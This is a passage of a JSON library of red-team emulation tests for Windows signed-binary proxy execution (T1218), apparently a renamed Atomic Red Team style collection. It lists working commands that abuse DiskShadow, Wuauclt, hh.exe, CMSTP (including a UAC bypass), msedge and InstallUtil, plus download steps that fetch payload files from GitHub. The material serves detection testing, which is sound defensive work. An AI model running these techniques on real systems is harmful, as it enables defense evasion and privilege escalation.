        {
          "description": "The RAGLOXTestHarnesses module must be installed and Invoke-ATHRemoteFXvGPUDisablementCommand must be exported in the module.",
          "check_command": "$RequiredModule = Get-Module -Name RAGLOXTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHRemoteFXvGPUDisablementCommand']) {exit 1} else {exit 0}",
          "install_command": "Install-Module -Name RAGLOXTestHarnesses -Scope CurrentUser -Force\n"
        }
      ],
      "rx_module_id": "9ebe7901-7edf-45c0-b5c7-8366300919db",
      "module_name": "Invoke-ATHRemoteFXvGPUDisablementCommand base test"
    },
    {
      "index": 965,
      "technique_id": "T1218",
      "technique_name": "Signed Binary Proxy Execution",
      "description": "Emulates attack with a DiskShadow.exe (LOLBIN installed by default on Windows) being used to execute arbitrary commands Reference: https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "#{dspath} -S #{txt_payload} \n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "txt_payload",
          "description": "txt to execute",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1218\\src\\T1218.txt"
        },
        {
          "name": "dspath",
          "description": "Default location of DiskShadow.exe",
          "type": "path",
          "default_value": "C:\\Windows\\System32\\diskshadow.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "txt file must exist on disk at specified location (#{txt_payload})",
          "check_command": "if (Test-Path \"#{txt_payload}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{txt_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1218/src/T1218.txt\" -OutFile \"#{txt_payload}\"\n"
        },
        {
          "description": "DiskShadow.exe must exist on disk at specified location (#{dspath})",
          "check_command": "if (Test-Path #{dspath}) {exit 0} else {exit 1}\n",
          "install_command": "echo \"DiskShadow.exe not found on disk at expected location\"\n"
        }
      ],
      "rx_module_id": "0e1483ba-8f0c-425d-b8c6-42736e058eaa",
      "module_name": "DiskShadow Command Execution"
    },
    {
      "index": 966,
      "technique_id": "T1218",
      "technique_name": "Signed Binary Proxy Execution",
      "description": "This test uses Wuauclt to load an arbitrary DLL. Upon execution with the default inputs, calculator.exe will be launched. \nSee https://dtm.uk/wuauclt/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "wuauclt.exe /UpdateDeploymentProvider \"#{arbitrary_dll}\" /RunHandlerComServer\n",
        "elevation_required": false,
        "cleanup_command": "taskkill /f /im calculator.exe > nul 2>&1"
      },
      "variables": [
        {
          "name": "arbitrary_dll",
          "description": "Path of DLL to be loaded",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\T1218\\bin\\calc.dll"
        }
      ],
      "prerequisites": [
        {
          "description": "DLL to load must exist on disk as specified location (#{arbitrary_dll})\n",
          "check_command": "if (test-path \"#{arbitrary_dll}\"){exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{arbitrary_dll}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/blob/master/rx_modules/T1218/bin/calc.dll?raw=true\" -OutFile \"#{arbitrary_dll}\"\n"
        }
      ],
      "rx_module_id": "49fbd548-49e9-4bb7-94a6-3769613912b8",
      "module_name": "Load Arbitrary DLL via Wuauclt (Windows Update Client)"
    },
    {
      "index": 967,
      "technique_id": "T1218",
      "technique_name": "Signed Binary Proxy Execution",
      "description": "Executes logon scripts configured in Group Policy.\nhttps://lolbas-project.github.io/lolbas/Binaries/Gpscript/\nhttps://oddvar.moe/2018/04/27/gpscript-exe-another-lolbin-to-the-list/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "Gpscript /logon\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "5bcda9cd-8e85-48fa-861d-b5a85d91d48c",
      "module_name": "Lolbin Gpscript logon option"
    },
    {
      "index": 968,
      "technique_id": "T1218",
      "technique_name": "Signed Binary Proxy Execution",
      "description": "Executes startup scripts configured in Group Policy\nhttps://lolbas-project.github.io/lolbas/Binaries/Gpscript/\nhttps://oddvar.moe/2018/04/27/gpscript-exe-another-lolbin-to-the-list/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "Gpscript /startup\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "f8da74bb-21b8-4af9-8d84-f2c8e4a220e3",
      "module_name": "Lolbin Gpscript startup option"
    },
    {
      "index": 969,
      "technique_id": "T1218",
      "technique_name": "Signed Binary Proxy Execution",
      "description": "Executes commands from a specially prepared ie4uinit.inf file.\nPoc from : https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/\nReference: https://lolbas-project.github.io/lolbas/Binaries/Ie4uinit/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "copy #{Path_ie4uinit} %TEMP%\\ie4uinit.exe\ncopy \"#{Path_inf}\" %TEMP%\\ieuinit.inf\n%TEMP%\\ie4uinit.exe -BaseSettings\n",
        "elevation_required": false,
        "cleanup_command": "del %TEMP%\\ie4uinit.exe >nul 2>&1\ndel %TEMP%\\ieuinit.inf >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "Path_inf",
          "description": "Path to the cab file",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1218\\src\\ieuinit.inf"
        },
        {
          "name": "Path_ie4uinit",
          "description": "Path to ie4uinit.exe",
          "type": "path",
          "default_value": "c:\\windows\\system32\\ie4uinit.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "ieuinit.inf must exist on disk at specified location (#{Path_inf})\n",
          "check_command": "if (Test-Path \"#{Path_inf}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{Path_inf}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1218/src/ieuinit.inf\" -OutFile \"#{Path_inf}\"\n"
        }
      ],
      "rx_module_id": "13c0804e-615e-43ad-b223-2dfbacd0b0b3",
      "module_name": "Lolbas ie4uinit.exe use as proxy"
    },
    {
      "index": 970,
      "technique_id": "T1218",
      "technique_name": "Signed Binary Proxy Execution",
      "description": "This test simulates an adversary copying `customshellhost.exe` and `calc.exe` from `C:\\windows\\system32\\` to `C:\\temp\\`, renaming `calc.exe` to `explorer.exe`.\nUpon execution, customshellhost.exe will spawn calc.exe.\nNote this will only work on Windows 10 or 11.\n[LOLBAS](https://lolbas-project.github.io/lolbas/Binaries/CustomShellHost/)\n[BishopFox](https://bishopfox.com/blog/edr-bypass-with-lolbins)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "if (-not (Test-Path #{dest_path})) {\nNew-Item -Path #{dest_path} -ItemType Directory\n} else {\nWrite-Host \"Directory #{dest_path} already exists.\" }\nCopy-Item -Path \"C:\\windows\\system32\\customshellhost.exe\" -Destination \"#{dest_path}\\customshellhost.exe\" -Force\nCopy-Item -Path \"C:\\windows\\system32\\calc.exe\" -Destination \"#{dest_path}\\explorer.exe\" -Force\n#{dest_path}\\customshellhost.exe\n",
        "elevation_required": true,
        "cleanup_command": "Remove-Item -Path #{dest_path} -Recurse -Force\n"
      },
      "variables": [
        {
          "name": "dest_path",
          "description": "Directory to copy files into",
          "type": "path",
          "default_value": "C:\\test"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "b1eeb683-90bb-4365-bbc2-2689015782fe",
      "module_name": "LOLBAS CustomShellHost to Spawn Process"
    },
    {
      "index": 971,
      "technique_id": "T1218",
      "technique_name": "Signed Binary Proxy Execution",
      "description": "Provlaunch.exe executes a command defined in the Registry. This test will create the necessary registry keys and values, then run provlaunch.exe to execute an arbitrary command.\n- https://twitter.com/0gtweet/status/1674399582162153472\n- https://lolbas-project.github.io/lolbas/Binaries/Provlaunch/\nRegistry keys are deleted after successful execution.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg.exe add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1 /v altitude /t REG_DWORD /d 0\nreg add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1\\dummy2 /v Commandline /d calc.exe\nc:\\windows\\system32\\provlaunch.exe LOLBin\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "ab76e34f-28bf-441f-a39c-8db4835b89cc",
      "module_name": "Provlaunch.exe Executes Arbitrary Command via Registry Key"
    },
    {
      "index": 972,
      "technique_id": "T1218",
      "technique_name": "Signed Binary Proxy Execution",
      "description": "Executes a process under a trusted Microsoft signed binary,mseddge. This test will spawn \"calc.exe\" as a child process of msedge.exe\n- https://lolbas-project.github.io/lolbas/Binaries/Msedge/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$edgePath64 = \"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe\"\nif (Test-Path $edgePath64) {\n    $edgePath = $edgePath64\n} else {\n    # Check 32-bit Edge installation path\n    $edgePath32 = \"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\"\n    if (Test-Path $edgePath32) {\n        $edgePath = $edgePath32\n    } else {\n        exit 1\n    }\n}\n& $edgePath --disable-gpu-sandbox --gpu-launcher=\"C:\\\\Windows\\\\System32\\\\calc.exe &&\"\nsleep 5\ntaskkill -f -im msedge.exe\ntaskkill -f -im calc.exe\ntaskkill -f -im win32calc.exe\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "e5eedaed-ad42-4c1e-8783-19529738a349",
      "module_name": "LOLBAS Msedge to Spawn Process"
    },
    {
      "index": 973,
      "technique_id": "T1218",
      "technique_name": "Signed Binary Proxy Execution",
      "description": "Use wlrmdr(Windows Logon Reminder executable) as a proxy binary to evade defensive countermeasures",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u \"#{payload_path}\"",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "payload_path",
          "description": "Path to the executable",
          "type": "String",
          "default_value": "C:\\Windows\\System32\\calc.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "7816c252-b728-4ea6-a683-bd9441ca0b71",
      "module_name": "System Binary Proxy Execution - Wlrmdr Lolbin"
    },
    {
      "index": 974,
      "technique_id": "T1218.001",
      "technique_name": "Signed Binary Proxy Execution: Compiled HTML File",
      "description": "Uses hh.exe to execute a local compiled HTML Help payload.\nUpon execution calc.exe will open\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "hh.exe \"#{local_chm_file}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "local_chm_file",
          "description": "Local .chm payload",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1218.001\\src\\T1218.001.chm"
        }
      ],
      "prerequisites": [
        {
          "description": "The payload must exist on disk at specified location (#{local_chm_file})\n",
          "check_command": "if (Test-Path \"#{local_chm_file}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{local_chm_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1218.001/src/T1218.001.chm\" -OutFile \"#{local_chm_file}\"\n"
        }
      ],
      "rx_module_id": "5cb87818-0d7c-4469-b7ef-9224107aebe8",
      "module_name": "Compiled HTML Help Local Payload"
    },
    {
      "index": 975,
      "technique_id": "T1218.001",
      "technique_name": "Signed Binary Proxy Execution: Compiled HTML File",
      "description": "Uses hh.exe to execute a remote compiled HTML Help payload.\nUpon execution displays an error saying the file cannot be open\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "hh.exe #{remote_chm_file}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "remote_chm_file",
          "description": "Remote .chm payload",
          "type": "url",
          "default_value": "https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1218.001/src/T1218.001.chm"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "0f8af516-9818-4172-922b-42986ef1e81d",
      "module_name": "Compiled HTML Help Remote Payload"
    },
    {
      "index": 976,
      "technique_id": "T1218.001",
      "technique_name": "Signed Binary Proxy Execution: Compiled HTML File",
      "description": "Executes a CHM file with the default Shortcut Command method.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Invoke-ATHCompiledHelp -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "chm_file_path",
          "description": "Default path of CHM",
          "type": "string",
          "default_value": "Test.chm"
        },
        {
          "name": "hh_file_path",
          "description": "path of modified HH.exe",
          "type": "path",
          "default_value": "$env:windir\\hh.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "The RAGLOXTestHarnesses module must be installed and Invoke-ATHCompiledHelp must be exported in the module.",
          "check_command": "$RequiredModule = Get-Module -Name RAGLOXTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}",
          "install_command": "Install-Module -Name RAGLOXTestHarnesses -Scope CurrentUser -Force\n"
        }
      ],
      "rx_module_id": "29d6f0d7-be63-4482-8827-ea77126c1ef7",
      "module_name": "Invoke CHM with default Shortcut Command Execution"
    },
    {
      "index": 977,
      "technique_id": "T1218.001",
      "technique_name": "Signed Binary Proxy Execution: Compiled HTML File",
      "description": "Executes a CHM file with the ITS protocol handler.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Invoke-ATHCompiledHelp -InfoTechStorageHandler #{infotech_storage_handler} -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "hh_file_path",
          "description": "path of modified HH.exe",
          "type": "path",
          "default_value": "$env:windir\\hh.exe"
        },
        {
          "name": "infotech_storage_handler",
          "description": "Default InfoTech Storage Protocol Handler",
          "type": "string",
          "default_value": "its"
        },
        {
          "name": "chm_file_path",
          "description": "Default path of CHM",
          "type": "string",
          "default_value": "Test.chm"
        }
      ],
      "prerequisites": [
        {
          "description": "The RAGLOXTestHarnesses module must be installed and Invoke-ATHCompiledHelp must be exported in the module.",
          "check_command": "$RequiredModule = Get-Module -Name RAGLOXTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}",
          "install_command": "Install-Module -Name RAGLOXTestHarnesses -Scope CurrentUser -Force\n"
        }
      ],
      "rx_module_id": "b4094750-5fc7-4e8e-af12-b4e36bf5e7f6",
      "module_name": "Invoke CHM with InfoTech Storage Protocol Handler"
    },
    {
      "index": 978,
      "technique_id": "T1218.001",
      "technique_name": "Signed Binary Proxy Execution: Compiled HTML File",
      "description": "Executes a CHM file simulating a user double click.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath #{chm_file_path}",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "chm_file_path",
          "description": "Default path of CHM",
          "type": "string",
          "default_value": "Test.chm"
        }
      ],
      "prerequisites": [
        {
          "description": "The RAGLOXTestHarnesses module must be installed and Invoke-ATHCompiledHelp must be exported in the module.",
          "check_command": "$RequiredModule = Get-Module -Name RAGLOXTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}",
          "install_command": "Install-Module -Name RAGLOXTestHarnesses -Scope CurrentUser -Force\n"
        }
      ],
      "rx_module_id": "5decef42-92b8-4a93-9eb2-877ddcb9401a",
      "module_name": "Invoke CHM Simulate Double click"
    },
    {
      "index": 979,
      "technique_id": "T1218.001",
      "technique_name": "Signed Binary Proxy Execution: Compiled HTML File",
      "description": "Executes a CHM file with a defined script engine, ITS Protocol Handler, and help topic extension.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Invoke-ATHCompiledHelp -ScriptEngine #{script_engine} -InfoTechStorageHandler #{infotech_storage_handler} -TopicExtension #{topic_extension} -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "topic_extension",
          "description": "Default Help Topic",
          "type": "string",
          "default_value": "html"
        },
        {
          "name": "hh_file_path",
          "description": "path of modified HH.exe",
          "type": "path",
          "default_value": "$env:windir\\hh.exe"
        },
        {
          "name": "infotech_storage_handler",
          "description": "Default InfoTech Storage Protocol Handler",
          "type": "string",
          "default_value": "its"
        },
        {
          "name": "script_engine",
          "description": "Default Script Engine",
          "type": "string",
          "default_value": "JScript"
        },
        {
          "name": "chm_file_path",
          "description": "Default path of CHM",
          "type": "string",
          "default_value": "Test.chm"
        }
      ],
      "prerequisites": [
        {
          "description": "The RAGLOXTestHarnesses module must be installed and Invoke-ATHCompiledHelp must be exported in the module.",
          "check_command": "$RequiredModule = Get-Module -Name RAGLOXTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}",
          "install_command": "Install-Module -Name RAGLOXTestHarnesses -Scope CurrentUser -Force\n"
        }
      ],
      "rx_module_id": "4f83adda-f5ec-406d-b318-9773c9ca92e5",
      "module_name": "Invoke CHM with Script Engine and Help Topic"
    },
    {
      "index": 980,
      "technique_id": "T1218.001",
      "technique_name": "Signed Binary Proxy Execution: Compiled HTML File",
      "description": "Executes a CHM file using the Shortcut Command method with a defined ITS Protocol Handler, and help topic extension.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Invoke-ATHCompiledHelp -ExecuteShortcutCommand -InfoTechStorageHandler #{infotech_storage_handler} -TopicExtension #{topic_extension} -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "topic_extension",
          "description": "Default Help Topic",
          "type": "string",
          "default_value": "html"
        },
        {
          "name": "hh_file_path",
          "description": "path of modified HH.exe",
          "type": "path",
          "default_value": "$env:windir\\hh.exe"
        },
        {
          "name": "infotech_storage_handler",
          "description": "Default InfoTech Storage Protocol Handler",
          "type": "string",
          "default_value": "its"
        },
        {
          "name": "chm_file_path",
          "description": "Default path of CHM",
          "type": "string",
          "default_value": "Test.chm"
        }
      ],
      "prerequisites": [
        {
          "description": "The RAGLOXTestHarnesses module must be installed and Invoke-ATHCompiledHelp must be exported in the module.",
          "check_command": "$RequiredModule = Get-Module -Name RAGLOXTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}",
          "install_command": "Install-Module -Name RAGLOXTestHarnesses -Scope CurrentUser -Force\n"
        }
      ],
      "rx_module_id": "15756147-7470-4a83-87fb-bb5662526247",
      "module_name": "Invoke CHM Shortcut Command with ITS and Help Topic"
    },
    {
      "index": 981,
      "technique_id": "T1218.001",
      "technique_name": "Signed Binary Proxy Execution: Compiled HTML File",
      "description": "Uses hh.exe to decompile a local compiled HTML Help file.\nUpon successful execution the chm file will decompile to disk.\nReference:https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/higaisa-or-winnti-apt-41-backdoors-old-and-new/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "hh.exe -decompile %temp% \"#{local_chm_file}\"\n",
        "elevation_required": false,
        "cleanup_command": "del %temp%\\T1218.001.html >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "local_chm_file",
          "description": "Local .chm payload",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1218.001\\src\\T1218.001.chm"
        }
      ],
      "prerequisites": [
        {
          "description": "The payload must exist on disk at specified location (#{local_chm_file})\n",
          "check_command": "if (Test-Path \"#{local_chm_file}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{local_chm_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1218.001/src/T1218.001.chm\" -OutFile \"#{local_chm_file}\"\n"
        }
      ],
      "rx_module_id": "20cb05e0-1fa5-406d-92c1-84da4ba01813",
      "module_name": "Decompile Local CHM File"
    },
    {
      "index": 982,
      "technique_id": "T1218.002",
      "technique_name": "Signed Binary Proxy Execution: Control Panel",
      "description": "This test simulates an adversary leveraging control.exe\nUpon execution calc.exe will be launched\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "control.exe \"#{cpl_file_path}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "cpl_file_path",
          "description": "path to cpl file",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1218.002\\bin\\calc.cpl"
        }
      ],
      "prerequisites": [
        {
          "description": "Cpl file must exist on disk at specified location (#{cpl_file_path})\n",
          "check_command": "if (Test-Path \"#{cpl_file_path}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{cpl_file_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1218.002/bin/calc.cpl\" -OutFile \"#{cpl_file_path}\"\n"
        }
      ],
      "rx_module_id": "037e9d8a-9e46-4255-8b33-2ae3b545ca6f",
      "module_name": "Control Panel Items"
    },
    {
      "index": 983,
      "technique_id": "T1218.003",
      "technique_name": "Signed Binary Proxy Execution: CMSTP",
      "description": "Adversaries may supply CMSTP.exe with INF files infected with malicious commands\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "cmstp.exe /s \"#{inf_file_path}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "inf_file_path",
          "description": "Path to the INF file",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1218.003\\src\\T1218.003.inf"
        }
      ],
      "prerequisites": [
        {
          "description": "INF file must exist on disk at specified location (#{inf_file_path})\n",
          "check_command": "if (Test-Path \"#{inf_file_path}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{inf_file_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1218.003/src/T1218.003.inf\" -OutFile \"#{inf_file_path}\"\n"
        }
      ],
      "rx_module_id": "34e63321-9683-496b-bbc1-7566bc55e624",
      "module_name": "CMSTP Executing Remote Scriptlet"
    },
    {
      "index": 984,
      "technique_id": "T1218.003",
      "technique_name": "Signed Binary Proxy Execution: CMSTP",
      "description": "Adversaries may invoke cmd.exe (or other malicious commands) by embedding them in the RunPreSetupCommandsSection of an INF file\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "cmstp.exe /s \"#{inf_file_uac}\" /au\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "inf_file_uac",
          "description": "Path to the INF file",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1218.003\\src\\T1218.003_uacbypass.inf"
        }
      ],
      "prerequisites": [
        {
          "description": "INF file must exist on disk at specified location (#{inf_file_uac})\n",
          "check_command": "if (Test-Path \"#{inf_file_uac}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{inf_file_uac}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1218.003/src/T1218.003_uacbypass.inf\" -OutFile \"#{inf_file_uac}\"\n"
        }
      ],
      "rx_module_id": "748cb4f6-2fb3-4e97-b7ad-b22635a09ab0",
      "module_name": "CMSTP Executing UAC Bypass"
    },
    {
      "index": 985,
      "technique_id": "T1218.004",
      "technique_name": "Signed Binary Proxy Execution: InstallUtil",
      "description": "Executes the CheckIfInstallable class constructor runner instead of executing InstallUtil. Upon execution, the InstallUtil test harness will be executed.\nIf no output is displayed the test executed successfuly.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. \"#{test_harness}\"\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$ExpectedOutput = 'Constructor_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nCheckIfInstallable method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n",
        "elevation_required": false,
        "cleanup_command": "$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "test_harness",
          "description": "location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1"
        },
        {
          "name": "assembly_dir",
          "description": "directory to drop the compiled installer assembly",
          "type": "path",
          "default_value": "$Env:TEMP\\"
        },
        {
          "name": "invocation_method",
          "description": "the type of InstallUtil invocation variant - Executable, InstallHelper, or CheckIfInstallable",
          "type": "string",
          "default_value": "CheckIfInstallable"
        },
        {
          "name": "assembly_filename",
          "description": "filename of the compiled installer assembly",
          "type": "string",
          "default_value": "T1218.004.dll"
        }
      ],
      "prerequisites": [
        {
          "description": "InstallUtil test harness script must be installed at specified location (#{test_harness})\n",
          "check_command": "if (Test-Path \"#{test_harness}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{test_harness}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest 'https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"#{test_harness}\"\n"
        }
      ],
      "rx_module_id": "ffd9c807-d402-47d2-879d-f915cf2a3a94",
      "module_name": "CheckIfInstallable method call"
    },
    {
      "index": 986,
      "technique_id": "T1218.004",
      "technique_name": "Signed Binary Proxy Execution: InstallUtil",
      "description": "Executes the InstallHelper class constructor runner instead of executing InstallUtil. Upon execution, no output will be displayed if the test\nexecuted successfuly.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. \"#{test_harness}\"\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallHelper method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n",
        "elevation_required": false,
        "cleanup_command": "$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "test_harness",
          "description": "location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1"
        },
        {
          "name": "assembly_dir",
          "description": "directory to drop the compiled installer assembly",
